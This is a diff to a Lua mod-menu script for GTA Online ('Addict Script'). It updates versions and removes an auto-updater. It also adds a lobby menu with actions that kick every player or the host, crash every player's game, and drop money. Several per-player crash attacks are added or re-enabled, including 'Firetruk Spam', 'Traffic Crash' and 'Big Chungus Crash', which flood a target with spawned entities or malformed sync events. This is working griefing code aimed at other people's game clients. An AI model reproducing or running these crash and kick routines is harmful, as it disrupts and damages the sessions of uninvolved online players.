@@ -2,16 +2,25 @@
 
 util.keep_running()
 util.require_natives("natives-1663599433-uno")
+util.require_natives("natives-1660775568-uno")
 util.require_natives("natives-1640181023")
 util.require_natives("natives-1651208000")
 util.require_natives("natives-1663599433")
+util.require_natives("natives-2944b")
+util.require_natives("natives-3274a")
+util.require_natives("natives-3407a")
 guidedMissile = require "ToxTool"
 
 local addict = menu
-local addict_version = 1.52
-local gta_version = "v3274"
+local addict_version = 1.53
+local gta_version = "v3411"
 local dcinv = "fg6Ex4PbkJ"
 local dev_mode = false -- Disables stuff like updates [true/false]
+
+local aalib = require("aalib")
+local PlaySound = aalib.play_sound
+local SND_ASYNC<const> = 0x0001
+local SND_FILENAME<const> = 0x00020000
 
 local function lan(msg)
     return util.log(msg), util.toast(msg)
@@ -129,44 +138,6 @@ local github = addict.list(addict.my_root(), "Updates", {"addictupdates"})
 addict.hyperlink(github, "Addict Discord", "https://discord.gg/" .. dcinv)
 addict.hyperlink(github, "View full Changelog on GitHub", "https://raw.githubusercontent.com/Addict0919/Addict-Script/main/AddictScript/AddictScriptChangelog")
 
-async_http.init("raw.githubusercontent.com","/Addict0919/Addict-Script/main/AddictScript/AddictScriptChangelog",function(text)
-    addict.action(github, "Changelog", {"addictchangelog"}, text, function() end)
-    response=true;
-end)
-async_http.dispatch()
-repeat util.yield()
-until response
-
---[[
-if not dev_mode then
-    async_http.init("raw.githubusercontent.com","/Addict0919/Addict-Script/main/AddictScript/AddictScriptVersion",function(b)
-    currentVer=tonumber(b)
-    response=true;
-    if addict_version~=currentVer then
-        lan("New Version found")async_http.init('raw.githubusercontent.com','/Addict0919/Addict-Script/main/AddictScript/Addict.lua',function(c)
-        local d=select(2,load(c))
-        if d then
-            lan("Update failed to download, please re-download manually via Github or using Addict Discord Server.")
-            return
-            end;
-            local e=io.open(filesystem.scripts_dir()..SCRIPT_RELPATH,"wb")
-            e:write(c)
-            e:close()
-            lan("Update Done!")
-            util.restart_script()
-            end)
-            async_http.dispatch()
-        end
-    end,
-    function()
-        response=true
-    end)
-    async_http.dispatch()
-    repeat util.yield()
-    until response
-end
-]]
-
 -- Memory Functions
 
 local orgScan = memory.scan
@@ -266,6 +237,7 @@ addCredit("Wigger", "A skilled coder who always has answers.")
 addCredit("Glitter", "A long-time friend since the early GTA days <3.")
 addCredit("Nosa", "A long-time friend and contributor to code and suggestions.")
 addCredit("Jailbroken", "A fast learner who made valuable contributions.")
+addCredit("sofakingwetodddid", "♔-_-ㄒㄖ乂丨匚 -_-♔")
 ---------------------------------------------------------------------------------
 addict.divider(Credits, "Great Supporters <3")
 ---------------------------------------------------------------------------------
@@ -312,6 +284,8 @@ util.create_tick_handler(function()
     end
 end)
 
+
+
 resources_dir = filesystem.resources_dir() .. '\\Addictscript\\'
 Addictscript_logo = directx.create_texture(resources_dir .. 'Addictscript_logo.png')
 
@@ -349,7 +323,8 @@ end)
             util.yield()
         end
     end)
-end
+    PlaySound(resources_dir .. "\\bruh.wav", SND_FILENAME | SND_ASYNC)
+        end
 
 --------------------------------------------------------------------------------------
 
@@ -1765,7 +1740,6 @@ end
 end)
 end)
 
---[[
 Mors_Mutual = addict.list(Recovery, "Mors Mutual", {"morsmutual"}, "", function(); end)
 
 addict.divider(Mors_Mutual, "Vehicle Gifting")
@@ -1866,16 +1840,16 @@ bitfield = memory.read_int(veh)
 memory.write_int(veh, bitfield & ((bitfield & (1 << 1)) ~= 0 and ~0x42 or ~0x40))
 end)
 
-addict.toggle_loop(Mors_Mutual, "Auto Claim All Personal Vehicles", {"autoclaimall"}, "Automatically claims all destroyed/impounded personal vehicles.", function()
+addict.toggle(Mors_Mutual, "Auto Claim All Personal Vehicles", {"autoclaimall"}, "Automatically claims all destroyed/impounded personal vehicles.", function()
 addict.trigger_commands("claimallveh")
 util.yield(1000)
 end, true)
 
-addict.toggle_loop(Mors_Mutual, "Auto Claim Personal Vehicle", {"autoclaimpersonal"}, "Automatically claims the current active personal vehicle.", function()
+addict.toggle(Mors_Mutual, "Auto Claim Personal Vehicle", {"autoclaimpersonal"}, "Automatically claims the current active personal vehicle.", function()
 addict.trigger_commands("claimpersonal")
 util.yield(1000)
 end, true)
-]]
+
 
 acidlabmanager = addict.list(Recovery, "Acid Lab Manager", {}, "", function(); end)
 
@@ -5434,7 +5408,6 @@ end
 end
 
 
-
 function do_label_preset(label, text)
 --util.log("Set label " .. label .. " > " .. text)
 addict.trigger_commands("addlabel " .. label)
@@ -5446,6 +5419,151 @@ addict.trigger_commands("addictlabelpresets")
 --addict.trigger_command(Player_List)
 util.toast("Label Set!")
 end
+
+--------------------------------------------------------------------------------------------------------------------
+
+Lobby_menu = addict.list(addict.my_root(), "Lobby Shit", {}, "", function() end)
+
+addict.divider(Lobby_menu, "Lobby")
+
+addict.action(Lobby_menu, "Give Crazy Loop", {"crazyloopto"}, "Script May Not Cope With Big Lobby.", function()
+    for pids = 0, 31 do
+        if excludeselected then
+            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
+                util.yield(2000)
+                addict.trigger_commands("crazyloop" .. PLAYER.GET_PLAYER_NAME(pids))
+            end
+        else
+            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
+                util.yield(2000)
+                addict.trigger_commands("crazyloop" .. PLAYER.GET_PLAYER_NAME(pids))
+            end
+        end
+    end
+end)
+
+addict.action(Lobby_menu, "Drop Cash", {"dropcashto"}, "Script May Not Cope With Big Lobby.", function()
+    for pids = 0, 31 do
+        if excludeselected then
+            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
+                util.yield(2000)
+                addict.trigger_commands("dropcash" .. PLAYER.GET_PLAYER_NAME(pids))
+            end
+        else
+            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
+                util.yield(2000)
+                addict.trigger_commands("dropcash" .. PLAYER.GET_PLAYER_NAME(pids))
+            end
+        end
+    end
+end)
+
+addict.action(Lobby_menu, "Kick Host", {"cskickhost"}, "Kicks the Host in your Current Session. Be careful with this, as you can get Karma'd if the Host is Modding.", function(on_click)
+    local CurrentHostId = players.get_host()
+    local CurrentHostName = players.get_name(CurrentHostId)
+    local string CurrentHostNameLower = CurrentHostName:lower()
+    if players.get_host() ~= players.user() then
+        addict.trigger_command(addict.ref_by_command_name("kick"..CurrentHostNameLower))
+    else
+        util.toast("-ToXic_Script-\n\nThis Command doesn't Work on yourself; You are already the Host!")
+    end
+    util.toast("Host Kick Completed")
+end)
+
+addict.action(Lobby_menu, "Kick Modders", {"cskickmodders"}, "Will use All Kicks on all Modders.", function(on_click)
+    for i = 0, 31, 1 do
+        if players.exists(i) and i ~= players.user() and players.is_marked_as_modder(i) then
+            local PlayerName = players.get_name(i)
+            local PlayerNameLower = PlayerName:lower()
+            addict.trigger_command(addict.ref_by_command_name("kick"..PlayerNameLower))
+        end
+    end
+    util.toast("Removing Session Modders")
+end)
+
+addict.action(Lobby_menu, "Kick All", {"cskickall"}, "Kicks every Player in the Session XD.", function(on_click)
+    for i = 0, 31, 1 do
+        if players.exists(i) and i ~= players.user() then
+            local string PlayerName = players.get_name(i)
+            local string PlayerNameLower = PlayerName:lower()
+            addict.trigger_command(addict.ref_by_command_name("kick"..PlayerNameLower))
+        end
+    end
+    util.toast("Lobby Kick Completed")
+end)
+
+addict.action(Lobby_menu, "Crash All", {"cscrashall"}, "Crashes every Player in the Session XD.", function(on_click)
+    for i = 0, 31, 1 do
+        if players.exists(i) and i ~= players.user() then
+            local string PlayerName = players.get_name(i)
+            local string PlayerNameLower = PlayerName:lower()
+            addict.trigger_command(addict.ref_by_command_name("crash"..PlayerNameLower))
+            addict.trigger_command(addict.ref_by_command_name("footlettuce"..PlayerNameLower))
+            addict.trigger_command(addict.ref_by_command_name("steamroll"..PlayerNameLower))
+        end
+    end
+    util.toast("Lobby Crash Completed")
+end)
+
+addict.action(Lobby_menu, "Ruiner Crash Lobby", {}, "", function()
+    local spped = PLAYER.PLAYER_PED_ID()
+    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
+    for i = 1, 15 do
+        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
+        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
+        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
+        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
+        util.yield(200)
+        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 260873931)
+        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
+        util.yield(200)
+        entities.delete_by_handle(Ruiner2)
+    end
+    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
+    util.toast("Lobby Crash Completed")
+end)
+
+addict.action(Lobby_menu, "Bad Parachute Crash", {}, "", function()
+    local user = players.user()
+    local user_ped = players.user_ped()
+    local pos = players.get_position(user)
+    util.yield(100)
+    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
+    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
+    TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
+    util.yield()
+    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
+    util.yield(250)
+    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
+    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
+    util.yield(1000)
+    for i = 1, 5 do
+        util.spoof_script("freemode", SYSTEM.WAIT)
+    end
+    ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
+    NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
+    util.toast("Parachute Crash Completed")
+end)
+
+addict.action(Lobby_menu, "Sound Crash Lobby", {}, "Beep Boop Crash", function()
+    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
+    local time = util.current_time_millis() + 2000
+    while time > util.current_time_millis() do
+        local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
+        for i = 1, 20 do
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x, TPPS.y, TPPS.z, "GTAO_FM_Events_Soundset",
+                true, 100000, false)
+        end
+        util.yield()
+        for i = 1, 20 do
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x, TPPS.y, TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
+        end
+        util.yield()
+    end
+    util.toast("Sound Crash Completed")
+end)
+
+--------------------------------------------------------------------------------------------------------------------
 
 Net_Shit = addict.list(addict.my_root(), "Net Shit", {"netshit"}, "", function(); end)
 
@@ -7893,7 +8011,7 @@ end)
 
 local lazereyes = false
 coords_ped = v3()
-coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
+coords_ped = ENTITY.GET_ENTITY_COORDS(players.user_ped(), true)
 coords_ped.x = coords_ped.x + math.random(-2, 2)
 coords_ped.y = coords_ped.y + math.random(-2, 2)
 coords_ped.z = coords_ped.z
@@ -8508,35 +8626,35 @@ end)
 
 projectiles = addict.list(worldchaos, "Edit Projectiles", {}, "", function(); end)
 
-projectile_cleanse = false
-addict.toggle(projectiles, "Delete Projectiles", {"deleteprojectiles"}, "This will piss people off.", function(on)
-projectile_cleanse = on
-mod_uses("object", if on then 1 else -1)
-end)
+-- projectile_cleanse = false
+-- addict.toggle(projectiles, "Delete Projectiles", {"deleteprojectiles"}, "This will piss people off.", function(on)
+-- projectile_cleanse = on
+-- mod_uses("object", if on then 1 else -1)
+-- end)
 
-projectile_warn = false
-addict.toggle(projectiles, "Draw Warning", {"drawwarning"}, "Draws a red box over projectiles to warn you of there existence.", function(on)
-projectile_warn = on
-mod_uses("object", if on then 1 else -1)
-end)
+-- projectile_warn = false
+-- addict.toggle(projectiles, "Draw Warning", {"drawwarning"}, "Draws a red box over projectiles to warn you of there existence.", function(on)
+-- projectile_warn = on
+-- mod_uses("object", if on then 1 else -1)
+-- end)
 
-projectile_spaz = false
-addict.toggle(projectiles, "Projectile Spaz", {"projectilespaz"}, "Makes projectiles follow a very unstable path.", function(on)
-projectile_spaz = on
-mod_uses("object", if on then 1 else -1)
-end)
+-- projectile_spaz = false
+-- addict.toggle(projectiles, "Projectile Spaz", {"projectilespaz"}, "Makes projectiles follow a very unstable path.", function(on)
+-- projectile_spaz = on
+-- mod_uses("object", if on then 1 else -1)
+-- end)
 
-slow_projectiles = false
-addict.toggle(projectiles, "Extremely Slow Projectiles", {"extremelyslowprojectiles"}, "", function(on)
-slow_projectiles = on
-mod_uses("object", if on then 1 else -1)
-end)
+-- slow_projectiles = false
+-- addict.toggle(projectiles, "Extremely Slow Projectiles", {"extremelyslowprojectiles"}, "", function(on)
+-- slow_projectiles = on
+-- mod_uses("object", if on then 1 else -1)
+-- end)
 
-blip_projectiles = false
-addict.toggle(projectiles, "Blips For Projectiles", {"blipsforprojectiles"}, "", function(on)
-blip_projectiles = on
-mod_uses("object", if on then 1 else -1)
-end)
+-- blip_projectiles = false
+-- addict.toggle(projectiles, "Blips For Projectiles", {"blipsforprojectiles"}, "", function(on)
+-- blip_projectiles = on
+-- mod_uses("object", if on then 1 else -1)
+-- end)
 
 
 areablocks = addict.list(worldchaos, "Block Entrances", {}, "", function(); end)
@@ -18441,6 +18559,12 @@ end)
 
 local frienm = addict.list(addict.player_root(pid), 'Friendly', {}, '')
 
+addict.action(frienm, "Fix loading screen", {"fix1"}, "Try to fix player's infinite loading screen by giving him script host and teleporting to nearest apartment.", function()
+menu.trigger_commands("givesh" .. players.get_name(pid))
+menu.trigger_commands("aptme" .. players.get_name(pid))
+menu.trigger_commands("interiorKick" .. player.get_name(pid))
+end, nil, nil, COMMANDPERM_FRIENDLY)
+
 addict.action(frienm, "Max Player", {"max"}, "Turns on Godmode, auto heal, ceopay, vehiclegodmode, vehicle boost, never wanted, gives all weapons, ammo/infinite and parachute all at once.", function ()
 addict.trigger_commands("arm".. players.get_name(pid) .. "all")
 addict.trigger_commands("bail".. players.get_name(pid))
@@ -18859,7 +18983,7 @@ addict.trigger_commands("aptme" .. players.get_name(pid))
 end, nil, nil, COMMANDPERM_FRIENDLY)
 
 
-local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
+local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_PED_ID())
 
 karma = {}
 function isAnyPlayerTargetingEntity(playerPed)
@@ -19239,7 +19363,7 @@ local synccrashes = addict.list(crash, "Sync Crashes", {}, "")
 local standcrash = addict.list(crash, "Stand Crash Loops", {"standcrashloops"}, "")
 
 --local BroHugCrashes = addict.list(crash, "Bro Hug Crashes", {"brohugcrashes"}, "")
---local chunguscrashes = addict.list(crash, "Big Chungus Crashes", {"bigchungustab"}, "")
+local chunguscrashes = addict.list(crash, "Big Chungus Crashes", {"bigchungustab"}, "")
 
 --         _____ ________________ ________  _   __
 --        / ___// ____/ ___/ ___//  _/ __ \/ | / /
@@ -19728,9 +19852,8 @@ util.toast("Michael Taxi Crash Sent to " .. players.get_name(pid))
 util.log("Michael Taxi Crash Sent to " .. players.get_name(pid))
 end)
 
---[[
-addict.toggle_loop(chunguscrashes, "Big Chungus Crash", {"bigchungus"}, "Skid from x-force Big CHUNGUS Crash. Coded by Picoles(RyzeScript)", function(on_toggle)
-local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
+addict.action(chunguscrashes, "Big Chungus Crash", {"bigchungus"}, "Skid from x-force Big CHUNGUS Crash. Coded by Picoles(RyzeScript)", function(on_click)
+local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
 local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
 local mdl = util.joaat("A_C_Cat_01")
 local mdl2 = util.joaat("U_M_Y_Zombie_01")
@@ -19997,7 +20120,7 @@ addict.trigger_commands("reducedcollision Off")
 addict.trigger_commands("nocollision Off")
 end
 end)
-]]
+
 
 addict.toggle_loop(badheadcrash, "Bad Head Blend", {"outfitcrash"}, "", function()
 BlockSyncs(pid, function()
@@ -26116,6 +26239,66 @@ end
 end
 end)
 
+addict.action(vehcrash,"Firetruk Spam", {}, "spams FireTruk's on target player, ", function()
+	while not STREAMING.HAS_MODEL_LOADED(1938952078) do
+		STREAMING.REQUEST_MODEL(1938952078)
+		util.yield(10)
+	end
+	local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
+       	local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 
+	ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)
+	notification("Started lagging", colors.black)
+	local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+	local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
+	spam_amount = 300
+	while spam_amount >= 1 do
+		entities.create_vehicle(1938952078, PlayerPedCoords, 0)
+		spam_amount = spam_amount - 1
+		util.yield(10)
+	end
+	notification("Done", colors.red) 
+end)
+
+addict.action(vehcrash, "Traffic Crash", {}, "Adios MuFucka", function(on_click)
+	local pCoords = Player.getPlayerPosition(pid)
+	local trafficLights = {}
+	util.request_model(-655644382)
+	for i = 1, 20 do
+	    local object = entities.create_object(-655644382, v3.new(pCoords.x + Utils.rand(-5, 5), pCoords.y + Utils.rand(-5, 5), pCoords.z + Utils.rand(-1, 0)))
+	    ENTITY.SET_ENTITY_ROTATION(object, 0, 0, Utils.rand(0, 360), 1, true)
+	    trafficLights[#trafficLights + 1] = object
+	end
+	local stopLights = false
+	util.create_tick_handler(function()
+	    if stopLights then
+	        return false
+	    end
+	    ENTITY.SET_ENTITY_TRAFFICLIGHT_OVERRIDE(trafficLights[Utils.rand(1, #trafficLights)], Utils.rand(0, 3))
+	end)
+	util.request_model(3253274834)
+	local vehicles = {}
+	local crashVehicle = entities.create_vehicle(3253274834, pCoords, 0)
+	vehicles[#vehicles + 1] = crashVehicle
+	VEHICLE.SET_VEHICLE_MOD_KIT(crashVehicle, 0)
+	Vehicle.setVehiclePlate(crashVehicle, "ICRASHU")
+	VEHICLE.SET_VEHICLE_MOD(crashVehicle, 34, 3)
+	for i = 1, 10 do
+	    vehicles[#vehicles + 1] = Vehicle.clone(crashVehicle)
+	end
+	util.yield(3000)
+	for i = 1, #vehicles do
+	    Entity.delete(vehicles[i])
+	end
+	util.yield(5000)
+	stopLights = true
+	util.yield(500)
+	for i = 1, #trafficLights do
+	    Entity.delete(trafficLights[i])
+	end
+	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3253274834)
+	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-655644382)
+end)
+
 addict.action(vehcrash, "Vehicle Crash", {"vehcrash"}, "Sends them with a few car trolls then ton of op crash events starting with car crash events", function()
 util.yield(1500)
 local hash = util.joaat("baller")
@@ -28367,35 +28550,35 @@ local Languages = {
 { Name = "Georgian", Key = "ka" },
 { Name = "German", Key = "de" },
 { Name = "Greek", Key = "el" },
-{ Name = "Gujarati", Key = "gu" },
-{ Name = "Haitian Creole", Key = "ht" },
-{ Name = "Hebrew", Key = "iw" },
-{ Name = "Hindi", Key = "hi" },
-{ Name = "Hungarian", Key = "hu" },
-{ Name = "Icelandic", Key = "is" },
-{ Name = "Indonesian", Key = "id" },
-{ Name = "Irish", Key = "ga" },
-{ Name = "Italian", Key = "it" },
+-- { Name = "Gujarati", Key = "gu" },
+-- { Name = "Haitian Creole", Key = "ht" },
+-- { Name = "Hebrew", Key = "iw" },
+-- { Name = "Hindi", Key = "hi" },
+-- { Name = "Hungarian", Key = "hu" },
+-- { Name = "Icelandic", Key = "is" },
+-- { Name = "Indonesian", Key = "id" },
+-- { Name = "Irish", Key = "ga" },
+-- { Name = "Italian", Key = "it" },
 { Name = "Japanese", Key = "ja" },
-{ Name = "Kannada", Key = "kn" },
+-- { Name = "Kannada", Key = "kn" },
 { Name = "Korean", Key = "ko" },
-{ Name = "Latin", Key = "la" },
-{ Name = "Latvian", Key = "lv" },
-{ Name = "Lithuanian", Key = "lt" },
-{ Name = "Macedonian", Key = "mk" },
-{ Name = "Malay", Key = "ms" },
-{ Name = "Maltese", Key = "mt" },
-{ Name = "Norwegian", Key = "no" },
-{ Name = "Persian", Key = "fa" },
+-- { Name = "Latin", Key = "la" },
+-- { Name = "Latvian", Key = "lv" },
+-- { Name = "Lithuanian", Key = "lt" },
+-- { Name = "Macedonian", Key = "mk" },
+-- { Name = "Malay", Key = "ms" },
+-- { Name = "Maltese", Key = "mt" },
+-- { Name = "Norwegian", Key = "no" },
+-- { Name = "Persian", Key = "fa" },
 { Name = "Polish", Key = "pl" },
 { Name = "Portuguese", Key = "pt" },
-{ Name = "Romanian", Key = "ro" },
+-- { Name = "Romanian", Key = "ro" },
 { Name = "Russian", Key = "ru" },
-{ Name = "Serbian", Key = "sr" },
+-- { Name = "Serbian", Key = "sr" },
 { Name = "Slovak", Key = "sk" },
 { Name = "Slovenian", Key = "sl" },
 { Name = "Spanish", Key = "es" },
-{ Name = "Swahili", Key = "sw" },
+-- { Name = "Swahili", Key = "sw" },
 { Name = "Swedish", Key = "sv" },
 { Name = "Tamil", Key = "ta" },
 { Name = "Telugu", Key = "te" },
@@ -28405,7 +28588,7 @@ local Languages = {
 { Name = "Urdu", Key = "ur" },
 { Name = "Vietnamese", Key = "vi" },
 { Name = "Welsh", Key = "cy" },
-{ Name = "Yiddish", Key = "yi" },
+-- { Name = "Yiddish", Key = "yi" },
 }
 
 local LangKeys = {}
@@ -28670,7 +28853,7 @@ addict.trigger_command(Clear_Minimap_Notifs)
 util.yield(1000)
 end)
 
---[[addict.toggle_loop(Net_Shit, "Accept Joins & Transaction Errors!", {"accepterrors"}, "Automatically accept join screens and transaction errors.", function()
+addict.toggle_loop(Net_Shit, "Accept Joins & Transaction Errors!", {"accepterrors"}, "Automatically accept join screens and transaction errors.", function()
 local mess_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
 if mess_hash == -896436592 then
 util.toast("This player left the session.")
@@ -28690,14 +28873,13 @@ end
 util.yield()
 end)
 
-addict.toggle_loop(Net_Shit, "Accept Joins", {"autojoin"}, "Automatically accept join screens reliably.", function()
+addict.toggle(Net_Shit, "Accept Joins", {"autojoin"}, "Automatically accept join screens reliably.", function()
 local message_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
 if message_hash == 15890625 or message_hash == -398982408 or message_hash == -587688989 then
 PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
 util.yield(200)
 end
 end, true)
-]]
 
 menu.toggle_loop(Net_Shit, "Auto Host", {"autohost"}, "Great for basic and regular users.", function() -- Credits to funmenu
 if not (players.get_host() == PLAYER.PLAYER_ID()) and not util.is_session_transition_active() then
@@ -28731,44 +28913,6 @@ memory.write_float(memory.script_global(glob.base + 30176), 200000.0)
 end
 end)
 
---[[
-joining_log = false
-joining_toast = false
-
-addict.toggle(Net_Shit, "Join/leave notifications", {}, "", function(on_toggle)
-if on_toggle then
-joining_log = true
-joining_toast = true
-else
-joining_log = false
-joining_toast = false
-end
-end)
-
-players.on_join(function(pid)
-while true do
---if joining_toast then
---    util.log(PLAYER.GET_PLAYER_NAME(pid) .. " joined")
---end
---if joining_log then
---    util.toast(PLAYER.GET_PLAYER_NAME(pid) .. " joined")
---end
-util.yield()
-end
-end)
-
-players.on_leave(function(pid)
-while true do
---if leave_toast then
---    util.log(PLAYER.GET_PLAYER_NAME(pid) .. " left")
---end
---if leave_log then
---    util.toast(PLAYER.GET_PLAYER_NAME(pid) .. " left")
---end
-util.yield()
-end
-end)
-]]
 
 local InitialPlayersList = players.list(true, true, true) -- Obtain list of players from Stand API
 for i=1, #InitialPlayersList do -- Loop through the received player list
@@ -28803,7 +28947,6 @@ end
 util.yield()
 end
 end)
-
 
 
 --for oppressor blacklist
